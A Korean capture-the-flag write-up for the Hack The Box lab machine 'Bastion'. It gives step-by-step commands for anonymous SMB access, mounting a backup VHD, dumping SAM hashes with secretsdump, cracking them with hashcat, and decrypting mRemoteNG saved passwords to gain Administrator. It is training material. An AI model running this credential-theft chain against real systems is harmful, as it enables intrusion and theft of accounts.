# Bastion (HTB) - Write-up

**난이도** : Easy  
**참고** : https://0xdf.gitlab.io/2019/09/07/htb-bastion.html
**OS** : Windows Server 2016 Standard  
**핵심 공격 경로**  
- Anonymous SMB → Backups 공유 → VHD 파일  
- VHD를 **네트워크 마운트 + guestmount**로 열어 SAM 해시 덤프  
- L4mpje 비밀번호 크랙 → SSH 접속 (user)  
- mRemoteNG 설정 파일(`confCons.xml`)에서 Administrator 비밀번호 **복호화** → root

> **가장 중요한 힌트**  
> note.txt : “VPN 느리니까 백업 파일 통째로 다운로드하지 마라”  
> → **SMB를 CIFS로 마운트** → **guestmount**로 VHD 직접 열기

---

## 환경 정보 요약

- IP : `10.10.10.134` (당시 기준)
- 열린 포트 : 22(SSH), 135(MSRPC), 139/445(SMB)
- 주요 테크닉 : SMB anonymous, VHD offline mount, secretsdump, mRemoteNG decrypt

---

## 1. Reconnaissance (정찰)

### 1-1. 전체 포트 스캔
```bash
nmap -sT -p- --min-rate 10000 -oA nmap/all-tcp 10.10.10.134
````

→ **22, 135, 139, 445** open

### 1-2. 스크립트 + 버전 스캔

Bash

```
nmap -sC -sV -p 22,135,139,445 -oA nmap/scripts-version 10.10.10.134
```

- SMBv1 지원, Windows Server 2016 추정
- OpenSSH for Windows → 나중에 사용자 획득 시 매우 유용

---

## 2. SMB Enumeration

### 2-1. 공유 목록 확인 (null session)

Bash

```
smbclient -N -L //10.10.10.134
# 또는
smbmap -H 10.10.10.134 -u guest
```

→ **Backups** 공유 (READ/EXEC 가능)

### 2-2. Backups 공유 탐색

Bash

```
smbclient -N //10.10.10.134/Backups
```

text

```
ls
```

파일 목록 예시

- note.txt
- SDT65CB.tmp
- WindowsImageBackup/

### 2-3. note.txt 내용 (중요!)

Bash

```
get note.txt
exit
cat note.txt
```

→ “VPN 느리니 백업 파일 전체 다운로드 금지” → **대용량 VHD를 smbclient get으로 받지 말 것** (끊김 현상 심함)

---

## 3. SMB → 로컬 마운트 (CIFS)

Bash

```
sudo mkdir -p /mnt/bastion
sudo mount -t cifs //10.10.10.134/Backups /mnt/bastion -o username=guest,password=,vers=1.0,ro
# vers=1.0 또는 guest 옵션 추가 필요할 수 있음
```

확인

Bash

```
ls /mnt/bastion
find /mnt/bastion -type f
```

→ WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/ 안에 **.vhd** 파일 2개 발견

---

## 4. VHD 마운트 (guestmount)

### 4-1. 준비

Bash

```
sudo apt update && sudo apt install -y libguestfs-tools
sudo mkdir -p /mnt/vhd
```

### 4-2. VHD 시도

첫 번째 VHD (보통 실패)

Bash

```
sudo guestmount --add "/mnt/bastion/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd" \
  --inspector --ro /mnt/vhd
```

→ “no operating system was found” 에러 → 정상 (보조 디스크)

두 번째 VHD (성공)

Bash

```
sudo guestmount --add "/mnt/bastion/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd" \
  --inspector --ro /mnt/vhd
```

확인

Bash

```
ls /mnt/vhd
# Users  Windows  Program Files  등 보이면 성공
```

---

## 5. Offline SAM 덤프

Bash

```
cd /mnt/vhd/Windows/System32/config

# impacket 사용 추천
secretsdump.py -sam SAM -system SYSTEM LOCAL
# SECURITY도 있으면 같이 넣기
# secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL
```

결과 예시

text

```
L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
```

→ NTLM 해시 : 26112010952d963c8dc4217daec986d9

### 5-1. 해시 크랙

Bash

```
hashcat -m 1000 2611201... /usr/share/wordlists/rockyou.txt
# 또는 crackstation.net
```

→ **L4mpje : bureaulampje**

---

## 6. User Foothold (SSH)

Bash

```
ssh L4mpje@10.10.10.134
# password: bureaulampje
```

User flag

cmd

```
type C:\Users\L4mpje\Desktop\user.txt
```

---

## 7. Privilege Escalation (mRemoteNG)

### 7-1. mRemoteNG 발견

cmd

```
cd C:\Users\L4mpje\AppData\Roaming\mRemoteNG
dir
type confCons.xml
```

→ <Node ... Password="aEWNFV5uGcjUHF0u..."> 형태의 암호화 문자열 존재

### 7-2. 복호화

대표적인 방법들

1. Python 스크립트 ([https://github.com/haseebT/mRemoteNG-Decrypt](https://github.com/haseebT/mRemoteNG-Decrypt) 등)
2. Java 도구 (decipher_mremoteng.jar 등)
3. Metasploit 모듈 (post/windows/gather/credentials/mremoteng)

예시 (Python)

Bash

```
python mremoteng-decrypt.py -s aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==
```

→ Administrator 비밀번호 획득 (예: thXLHM96BeKL0ER2)

---

## 8. Administrator → Root Flag

Bash

```
ssh administrator@10.10.10.134
# 또는 evil-winrm -i 10.10.10.134 -u administrator -p 'thXLHM96BeKL0ER2'
```

Root flag

cmd

```
type C:\Users\Administrator\Desktop\root.txt
```

---

## Attack Chain 한 줄 요약

SMB(anonymous) → CIFS mount → guestmount VHD → secretsdump SAM → crack L4mpje → SSH user → mRemoteNG confCons.xml → decrypt Administrator → SSH admin → pwned!

---

## 추가 팁 & 주의사항

- VHD 2개 중 **크기가 큰 쪽** (≈5GB)이 보통 OS 디스크
- guestmount 실패 시 → virt-filesystems -a 파일.vhd로 파티션 확인 후 -m /dev/sda1 옵션 추가
- SMB 마운트 옵션에 vers=1.0 또는 nounix,noserverino 추가하면 안정적
- mRemoteNG 복호화 도구는 여러 개 있으니 본인 환경 맞는 것 사용 (Python/Java 모두 무난)
- **정리** (꼭!)

Bash

```
sudo guestunmount /mnt/vhd
sudo umount /mnt/bastion
```